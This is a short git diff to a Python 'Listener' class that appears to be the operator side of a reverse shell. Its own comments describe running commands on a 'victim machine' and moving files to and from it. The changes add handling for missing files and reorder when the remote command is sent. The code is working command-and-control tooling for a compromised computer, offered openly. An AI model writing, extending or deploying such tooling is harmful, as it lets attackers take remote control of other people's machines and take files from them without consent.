@@ -53,8 +53,11 @@ class Listener:
 
     # Read and write files in base64 format to transfer bytes reliably.
     def read_file(self, path):
-        with open(path, 'rb') as file:
-            return base64.b64encode(file.read())
+        try:
+            with open(path, 'rb') as file:
+                return base64.b64encode(file.read())
+        except FileNotFoundError as e:
+            print(e.strerror)
 
     def write_file(self, path, content):
         with open(path, "wb") as file:
@@ -64,14 +67,14 @@ class Listener:
     # Here we are sending commands to be executed on victim machine which their result
     # will be sent back to us
     def run(self):
+
+        result = ""
+
         while True:
 
             # Input commands from terminal
             command = input(">> ")
             command = command.split(" ")
-
-            # Execute the input command and assign it to the result variable
-            result = self.execute_remotely(command)
 
             # Get files from the victim machine
             if command[0] == "download":
@@ -80,7 +83,12 @@ class Listener:
             # Send files to the victim machine
             elif command[0] == "upload":
                 file_content = self.read_file(command[1])
+                if file_content is None:
+                    continue
                 command.append(file_content.decode())
+
+            # Execute the input command and assign it to the result variable
+            result = self.execute_remotely(command)
 
             # Print results to the terminal
             print(result)
